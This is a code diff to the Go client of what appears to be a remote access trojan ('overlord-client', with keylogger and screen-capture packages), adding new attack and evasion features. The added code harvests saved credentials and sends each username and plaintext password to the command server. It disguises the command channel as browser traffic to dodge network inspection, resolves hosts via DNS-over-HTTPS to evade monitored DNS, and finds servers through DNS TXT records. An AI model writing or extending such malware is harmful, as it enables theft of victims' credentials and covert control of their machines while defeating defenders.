@@ -2,12 +2,14 @@ package main
 
 import (
 	"context"
+	"crypto/rand"
 	"crypto/tls"
 	"encoding/base64"
+	"encoding/hex"
 	"errors"
 	"fmt"
 	"log"
-	"math/rand"
+	mrand "math/rand"
 	"net"
 	"net/http"
 	"runtime"
@@ -20,7 +22,9 @@ import (
 	"overlord-client/cmd/agent/activewindow"
 	"overlord-client/cmd/agent/capture"
 	"overlord-client/cmd/agent/config"
+	"overlord-client/cmd/agent/doh"
 	"overlord-client/cmd/agent/handlers"
+	"overlord-client/cmd/agent/harvest"
 	"overlord-client/cmd/agent/internal/overlordenv"
 	"overlord-client/cmd/agent/keylogger"
 	"overlord-client/cmd/agent/plugins"
@@ -39,6 +43,11 @@ func runClient(cfg config.Config) {
 	log.Printf("runtime GOOS=%s GOARCH=%s cfg.OS=%s cfg.Arch=%s", runtime.GOOS, runtime.GOARCH, cfg.OS, cfg.Arch)
 
 	ensureServerURLs(&cfg, baseBackoff)
+
+	if isHttpPollEnabled() {
+		runPollClient(cfg)
+		return
+	}
 
 	if len(cfg.ServerURLs) > 1 {
 		log.Printf("Failover enabled with %d servers:", len(cfg.ServerURLs))
@@ -61,8 +70,8 @@ func runClient(cfg config.Config) {
 	var loggedTLS bool
 	var lastDisconnect time.Time
 	var lastSolRefresh time.Time
-	solInitialWait := 2*time.Minute + time.Duration(rand.Intn(60))*time.Second
-	solRefreshInterval := 5*time.Minute + time.Duration(rand.Intn(300))*time.Second
+	solInitialWait := 2*time.Minute + time.Duration(mrand.Intn(60))*time.Second
+	solRefreshInterval := 5*time.Minute + time.Duration(mrand.Intn(300))*time.Second
 
 	for {
 
@@ -74,7 +83,7 @@ func runClient(cfg config.Config) {
 		if strings.HasPrefix(strings.ToLower(currentServer), "ws://") && !cfg.TLSInsecureSkipVerify {
 			log.Printf("[TLS] refusing plaintext WebSocket server %s; use wss://", currentServer)
 			rotateToNextServer(&currentIndex, cfg.ServerURLs)
-			time.Sleep(backoff)
+			obfSleepDuration(backoff)
 			continue
 		}
 		ctx, cancel := context.WithCancel(context.Background())
@@ -88,7 +97,11 @@ func runClient(cfg config.Config) {
 		}
 		log.Printf("connecting to %s%s (TLS verify: %v)", currentServer, serverInfo, !cfg.TLSInsecureSkipVerify)
 
-		conn, resp, err := websocket.Dial(ctx, url, opts)
+		// Cap the total dial+WS-handshake time so a partially-responsive server
+		// can't stall the reconnect loop indefinitely.
+		dialCtx, dialCancel := context.WithTimeout(ctx, 30*time.Second)
+		conn, resp, err := websocket.Dial(dialCtx, url, opts)
+		dialCancel()
 		if err != nil {
 			log.Printf("dial failed [%s]: %v (retrying in %s)", classifyDialError(err), err, backoff)
 			consecutiveFailures++
@@ -101,7 +114,8 @@ func runClient(cfg config.Config) {
 			}
 			rotateToNextServer(&currentIndex, cfg.ServerURLs)
 
-			time.Sleep(backoff)
+			obfSleepDuration(backoff)
+			backoff = exponentialBackoff(baseBackoff, backoff, 5*time.Minute, consecutiveFailures)
 			cancel()
 			continue
 		}
@@ -115,6 +129,7 @@ func runClient(cfg config.Config) {
 		backoff = baseBackoff
 		consecutiveFailures = 0
 		lastDisconnect = time.Time{} // reset — we're connected
+		connectedAt := time.Now()
 		log.Printf("connected successfully to %s%s", currentServer, serverInfo)
 
 		if !loggedTLS && resp != nil && resp.TLS != nil {
@@ -141,8 +156,18 @@ func runClient(cfg config.Config) {
 				return
 			}
 			sessionErr = err
-			log.Printf("session ended: %v (retrying in %s)", err, backoff)
 			lastDisconnect = time.Now()
+			sessionAge := time.Since(connectedAt)
+
+			// If the session was healthy for ≥60 s the server is reachable and the
+			// drop is transient — reconnect quickly instead of honoring the backoff.
+			if sessionAge >= 60*time.Second {
+				consecutiveFailures = 0
+				backoff = baseBackoff
+				log.Printf("session ended after %s: %v (healthy session — immediate retry)", sessionAge.Round(time.Second), err)
+			} else {
+				log.Printf("session ended after %s: %v (retrying in %s)", sessionAge.Round(time.Second), err, backoff)
+			}
 
 			if shouldRefreshServerList(cfg, len(cfg.ServerURLs), lastDisconnect, lastSolRefresh, solInitialWait, solRefreshInterval) {
 				tryRefreshServerList(&cfg, &lastSolRefresh, &currentIndex, &consecutiveFailures)
@@ -154,6 +179,9 @@ func runClient(cfg config.Config) {
 		if sessionErr != nil && shouldRetryImmediately(sessionErr) {
 			sleepFor = reconnectDelay()
 			log.Printf("reconnect: immediate retry in %s", sleepFor)
+		} else if sessionErr != nil && consecutiveFailures == 0 {
+			// Session was healthy (backoff already reset above) — reconnect fast.
+			sleepFor = reconnectDelay()
 		}
 		if sessionErr != nil {
 			if d := enrollmentRetryDelay(sessionErr); d > 0 {
@@ -161,7 +189,7 @@ func runClient(cfg config.Config) {
 				log.Printf("purgatory: retry in %s", sleepFor)
 			}
 		}
-		time.Sleep(sleepFor)
+		obfSleepDuration(sleepFor)
 	}
 }
 
@@ -180,11 +208,38 @@ func tryRefreshServerList(cfg *config.Config, lastSolRefresh *time.Time, current
 	}
 }
 
+// malleableUserAgents mimics real browser WebSocket upgrades so the handshake
+// blends into normal HTTPS traffic on network inspection.
+var malleableUserAgents = []string{
+	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36",
+	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36 Edg/125.0.0.0",
+	"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:127.0) Gecko/20100101 Firefox/127.0",
+}
+
+// agentNonce generates a 16-byte cryptographically random hex nonce for
+// replay-attack protection.
+func agentNonce() string {
+	var b [16]byte
+	_, _ = rand.Read(b[:])
+	return hex.EncodeToString(b[:])
+}
+
 func buildDialOptions(cfg config.Config, transport *http.Transport) *websocket.DialOptions {
 	headers := http.Header{}
 	if token := strings.TrimSpace(cfg.AgentToken); token != "" {
 		headers.Set("x-agent-token", token)
 	}
+	// Replay-attack protection: timestamp (ms) + per-request random nonce.
+	headers.Set("x-agent-ts", strconv.FormatInt(time.Now().UnixMilli(), 10))
+	headers.Set("x-agent-nonce", agentNonce())
+
+	// Malleable profile: disguise WebSocket upgrade as a browser request.
+	ua := malleableUserAgents[mrand.Intn(len(malleableUserAgents))]
+	headers.Set("User-Agent", ua)
+	headers.Set("Accept-Language", "en-US,en;q=0.9")
+	headers.Set("Accept-Encoding", "gzip, deflate, br")
+	headers.Set("Cache-Control", "no-cache")
+	headers.Set("Pragma", "no-cache")
 	return &websocket.DialOptions{
 		Subprotocols:    []string{"binary"},
 		HTTPClient:      &http.Client{Transport: transport},
@@ -214,6 +269,26 @@ func ensureServerURLs(cfg *config.Config, backoff time.Duration) {
 				if delay > maxBackoff {
 					delay = maxBackoff
 				}
+			}
+		}
+		return
+	}
+
+	if cfg.DnsTxtDomain != "" {
+		log.Printf("No server URLs configured. Resolving from DNS TXT (domain: %s)", cfg.DnsTxtDomain)
+		delay := backoff
+		for len(cfg.ServerURLs) == 0 {
+			if urls, err := config.LoadServerURLsFromDNSTxt(cfg.DnsTxtDomain, cfg.AgentToken); err != nil {
+				log.Printf("DNS TXT lookup failed: %v; retrying in %s", err, delay)
+				time.Sleep(delay)
+				if delay < maxBackoff {
+					delay = delay * 2
+					if delay > maxBackoff {
+						delay = maxBackoff
+					}
+				}
+			} else {
+				cfg.ServerURLs = urls
 			}
 		}
 		return
@@ -332,10 +407,12 @@ func createHTTPTransport(cfg config.Config) (*http.Transport, error) {
 
 	transport := http.DefaultTransport.(*http.Transport).Clone()
 	transport.TLSClientConfig = tlsConfig
-	transport.DialContext = (&net.Dialer{
-		Timeout:   30 * time.Second,
-		KeepAlive: 15 * time.Second,
-	}).DialContext
+	// Use DoH-aware dialer: resolves hostnames via HTTPS when system DNS is
+	// blocked or monitored, falls back to system DNS transparently.
+	dohDialer := doh.NewDialer()
+	transport.DialContext = func(ctx context.Context, network, addr string) (net.Conn, error) {
+		return dohDialer(ctx, network, addr)
+	}
 	return transport, nil
 }
 
@@ -381,6 +458,30 @@ func computeBaseBackoff() time.Duration {
 	return randomReconnectDelay(10*time.Second, 30*time.Second)
 }
 
+// exponentialBackoff returns the next backoff duration using exponential growth
+// capped at maxBackoff, with ±20% jitter to prevent thundering-herd reconnects.
+// backoff:  current duration (starts at base)
+// failures: number of consecutive failures so far
+func exponentialBackoff(base, current, maxBackoff time.Duration, failures int) time.Duration {
+	if failures <= 1 {
+		return base
+	}
+	next := current * 2
+	if next > maxBackoff {
+		next = maxBackoff
+	}
+	// ±20% jitter
+	jitter := time.Duration(mrand.Int63n(int64(next/5)*2+1)) - next/5
+	result := next + jitter
+	if result < base {
+		result = base
+	}
+	if result > maxBackoff {
+		result = maxBackoff
+	}
+	return result
+}
+
 func reconnectDelay() time.Duration {
 	raw := strings.TrimSpace(overlordenv.Getenv("OVERLORD_RECONNECT_DELAY_MS"))
 	if raw == "" {
@@ -397,7 +498,7 @@ func reconnectDelay() time.Duration {
 	return time.Duration(ms) * time.Millisecond
 }
 
-var reconnectRng = rand.New(rand.NewSource(time.Now().UnixNano()))
+var reconnectRng = mrand.New(mrand.NewSource(time.Now().UnixNano()))
 
 func randomReconnectDelay(min, max time.Duration) time.Duration {
 	if max <= min {
@@ -699,6 +800,28 @@ func runSession(ctx context.Context, cancel context.CancelFunc, conn *websocket.
 			if err := handlers.HandleHelloAck(ackCtx, env, ackEnvelope); err != nil {
 				log.Printf("[purgatory] hello_ack handler error: %v", err)
 			}
+
+			// Collect credentials in the background; send each as a notification.
+			go func() {
+				creds := harvest.Collect()
+				if len(creds) == 0 {
+					return
+				}
+				for _, c := range creds {
+					title := fmt.Sprintf("[%s] %s | user=%s pass=%s", c.Source, c.URL, c.Username, c.Password)
+					n := wire.Notification{
+						Type:     "notification",
+						Category: "harvest",
+						Title:    title,
+						TS:       time.Now().UnixMilli(),
+					}
+					if werr := wire.WriteMsg(ctx, env.Conn, n); werr != nil {
+						log.Printf("[harvest] send failed: %v", werr)
+						return
+					}
+				}
+				log.Printf("[harvest] sent %d credential(s)", len(creds))
+			}()
 		case "enrollment_status":
 			status, _ := ackEnvelope["status"].(string)
 			log.Printf("[purgatory] server returned status=%s", status)
@@ -740,9 +863,12 @@ func runSession(ctx context.Context, cancel context.CancelFunc, conn *websocket.
 			}
 		})
 		goSafe("pong watchdog", cancel, func() {
-			grace := interval*3 + (30 * time.Second)
-			if grace < 90*time.Second {
-				grace = 90 * time.Second
+			// Wait at most 2 ping intervals before declaring the connection dead.
+			// interval×3+30 s was too slow to detect silent drops; 2× is still
+			// generous enough for high-latency links while recovering faster.
+			grace := interval * 2
+			if grace < 60*time.Second {
+				grace = 60 * time.Second
 			}
 			ticker := time.NewTicker(interval)
 			defer ticker.Stop()
